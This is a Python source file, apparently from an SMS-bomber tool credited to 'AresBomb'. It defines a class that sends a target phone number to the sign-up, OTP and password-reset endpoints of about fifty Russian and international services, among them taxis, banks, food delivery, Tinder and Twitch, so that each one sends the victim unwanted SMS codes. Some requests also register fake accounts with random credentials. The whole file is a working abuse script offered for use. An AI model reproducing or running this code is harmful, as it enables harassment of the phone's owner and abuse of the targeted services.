import requests
from requests import post
import random

class Sms(object):
    
    all = 49
    author = "Старая база AresBomb"
    
    def __init__(self):
        pass

    def send(self, serv, phone):
        _name = ''
        for x in range(12):
            _name = _name + random.choice(list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))
            password = _name + random.choice(list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))
            username = _name + random.choice(list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))
        
        _phone = phone
        
        _phone9 = _phone[1:]
       	_phonePizzahut = '+'+_phone[0]+' ('+_phone[1:4]+') '+_phone[4:7]+' '+_phone[7:9]+' '+_phone[9:11]
        
        _email = _name+'@gmail.com'
        email = _name+'@gmail.com'
        
       	if serv == 0: post('https://p.grabtaxi.com/api/passenger/v2/profiles/register', data={'phoneNumber': _phone,'countryCode': 'ID','name': 'test','email': 'mail@mail.com','deviceToken': '*'}, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.117 Safari/537.36'})
       	elif serv == 1: post('https://moscow.rutaxi.ru/ajax_keycode.html', data={'l': _phone9}).json()["res"]
       	elif serv == 2: post('https://belkacar.ru/get-confirmation-code', data={'phone': _phone}, headers={})
       	elif serv == 3: post('https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru', data={'phone_number': _phone}, headers={})
       	# elif serv == 4: post('https://app.karusel.ru/api/v1/phone/', data={'phone': _phone}, headers={})
       	elif serv == 5: post('https://api.tinkoff.ru/v1/sign_up', data={'phone': '+'+_phone}, headers={})
       	elif serv == 6: post('https://api.mtstv.ru/v1/users', json={'msisdn': _phone}, headers={})
       	elif serv == 7: post('https://youla.ru/web-api/auth/request_code', data={'phone': _phone})
       	elif serv == 8: post('https://pizzahut.ru/account/password-reset', data={'reset_by':'phone', 'action_id':'pass-recovery', 'phone': _phonePizzahut, '_token':'*'})
       	elif serv == 9: post('https://www.rabota.ru/remind', data={'credential': _phone})
       	elif serv == 10: post('https://rutube.ru/api/accounts/sendpass/phone', data={'phone': '+'+_phone})
       	elif serv == 11: post('https://www.citilink.ru/registration/confirm/phone/+'+_phone+'/')
       	elif serv == 12: post('https://www.smsint.ru/bitrix/templates/sms_intel/include/ajaxRegistrationTrigger.php', data={'name': _name,'phone': _phone, 'promo': 'yellowforma'})
       	elif serv == 13: post('https://www.mvideo.ru/internal-rest-api/common/atg/rest/actors/VerificationActor/getCodeForOtp', params={'pageName': 'loginByUserPhoneVerification', 'fromCheckout': 'false','fromRegisterPage': 'true','snLogin': '','bpg': '','snProviderId': ''}, data={'phone': _phone,'g-recaptcha-response': '','recaptcha': 'on'})
       	elif serv == 14: requests.get('https://www.oyorooms.com/api/pwa/generateotp?phone='+_phone9+'&country_code=%2B7&nod=4&locale=en')
       	elif serv == 15: post('https://newnext.ru/graphql', json={'operationName': 'registration', 'variables': {'client': {'firstName': 'Иван', 'lastName': 'Иванов', 'phone': _phone,'typeKeys': ['Unemployed']}},'query': 'mutation registration($client: ClientInput!) {''\n  registration(client: $client) {''\n    token\n    __typename\n  }\n}\n'})
       	elif serv == 16: post('https://api.sunlight.net/v3/customers/authorization/', data={'phone': _phone})
       	elif serv == 17: post('https://alpari.com/api/ru/protection/deliver/2f178b17990ca4b7903aa834b9f54c2c0bcb01a2/', json={'client_type': 'personal', 'email': _email, 'mobile_phone': _phone, 'deliveryOption': 'sms'})
       	elif serv == 18: post('https://lk.invitro.ru/lk2/lka/patient/refreshCode', data={'phone': _phone})
       	elif serv == 19: post('https://online.sbis.ru/reg/service/', json={'jsonrpc':'2.0','protocol':'5','method':'Пользователь.ЗаявкаНаФизика','params':{'phone':_phone},'id':'1'})
       	elif serv == 20: post('https://ib.psbank.ru/api/authentication/extendedClientAuthRequest', json={'firstName':'Иван','middleName':'Иванович','lastName':'Иванов','sex':'1','birthDate':'10.10.2000','mobilePhone': _phone9,'russianFederationResident':'true','isDSA':'false','personalDataProcessingAgreement':'true','bKIRequestAgreement':'null','promotionAgreement':'true'})
       	elif serv == 21: post('https://myapi.beltelecom.by/api/v1/auth/check-phone?lang=ru', data={'phone': _phone})
       	# elif serv == 22: post('https://app.karusel.ru/api/v1/phone/', data={'phone': _phone})
       	elif serv == 23: post('https://app-api.kfc.ru/api/v1/common/auth/send-validation-sms', json={'phone': '+' + _phone})
       	elif serv == 24: post("https://api.carsmile.com/",json={"operationName": "enterPhone", "variables": {"phone": _phone},"query": "mutation enterPhone($phone: String!) {\n  enterPhone(phone: $phone)\n}\n"})
       	elif serv == 25: post('https://www.citilink.ru/registration/confirm/phone/+' + _phone + '/')
       	elif serv == 26: post("https://api.delitime.ru/api/v2/signup",data={"SignupForm[username]": _phone, "SignupForm[device_type]": 3})
       	elif serv == 27: post('https://www.delivery-club.ru/ajax/user_otp', data={"phone": _phone})
       	elif serv == 28: post("https://guru.taxi/api/v1/driver/session/verify",json={"phone": {"code": 1, "number": _phone}})
       	elif serv == 29: post('https://www.icq.com/smsreg/requestPhoneValidation.php',data={'msisdn': _phone, "locale": 'en', 'countryCode': 'ru','version': '1', "k": "ic1rtwz1s1Hj1O0r", "r": "46763"})
       	elif serv == 30: post("https://terra-1.indriverapp.com/api/authorization?locale=ru",data={"mode": "request", "phone": "+" + _phone,"phone_permission": "unknown", "stream_id": 0, "v": 3, "appversion": "3.20.6","osversion": "unknown", "devicemodel": "unknown"})
       	elif serv == 31: post("https://lk.invitro.ru/sp/mobileApi/createUserByPassword", data={"password": password, "application": "lkp", "login": "+" + _phone})
       	elif serv == 32: post('https://ube.pmsm.org.ru/esb/iqos-phone/validate',json={"phone": _phone})
       	elif serv == 33: post("https://api.ivi.ru/mobileapi/user/register/phone/v6",data={"phone": _phone})
       	elif serv == 34: post('https://lenta.com/api/v1/authentication/requestValidationCode',json={'phone': '+' + self.formatted_phone})
       	elif serv == 35: post('https://cloud.mail.ru/api/v2/notify/applink',json={"phone": "+" + _phone, "api": 2, "email": "email","x-email": "x-email"})
       	elif serv == 36: post('https://www.mvideo.ru/internal-rest-api/common/atg/rest/actors/VerificationActor/getCode',params={"pageName": "registerPrivateUserPhoneVerificatio"},data={"phone": _phone, "recaptcha": 'off', "g-recaptcha-response": ""})
       	elif serv == 37: post("https://ok.ru/dk?cmd=AnonymRegistrationEnterPhone&st.cmd=anonymRegistrationEnterPhone",data={"st.r.phone": "+" + _phone})
       	elif serv == 38: post('https://plink.tech/register/',json={"phone": _phone})
       	elif serv == 39: post("https://qlean.ru/clients-api/v2/sms_codes/auth/request_code",json={"phone": _phone})
       	elif serv == 40: post("http://smsgorod.ru/sendsms.php",data={"number": _phone})
       	elif serv == 41: post('https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru',data={'phone_number': _phone})
       	elif serv == 42: post('https://passport.twitch.tv/register?trusted_request=true',json={"birthday": {"day": 11, "month": 11, "year": 1999},"client_id": "kd1unb4b3q4t58fwlpcbzcbnm76a8fp", "include_verification_code": True,"password": password, "phone_number": _phone,"username": username})
       	elif serv == 43: post('https://cabinet.wi-fi.ru/api/auth/by-sms', data={'msisdn': _phone},headers={'App-ID': 'cabinet'})
       	elif serv == 44: post("https://api.wowworks.ru/v2/site/send-code",json={"phone": _phone, "type": 2})
       	elif serv == 45: post('https://eda.yandex/api/v1/user/request_authentication_code',json={"phone_number": "+" + _phone})
       	elif serv == 46: post('https://youla.ru/web-api/auth/request_code', data={'phone': _phone})
       	elif serv == 47: post('https://alpari.com/api/ru/protection/deliver/2f178b17990ca4b7903aa834b9f54c2c0bcb01a2/',json={"client_type": "personal", "email": f"{email}@gmail.ru","mobile_phone": _phone, "deliveryOption": "sms"})
       	elif serv == 48: post("https://api-prime.anytime.global/api/v2/auth/sendVerificationCode",data={"phone": _phone})
       	elif serv == 49: post('https://b.utair.ru/api/v1/login/', data = {'login': _phone, }, headers = {'Accept-Language':'en-US,en;q=0.5', 'Connection':'keep-alive', 'Host':'b.utair.ru', 'origin':'https://www.utair.ru','Referer':'https://www.utair.ru/'})
       	else: print("Ошибка сервиса")    
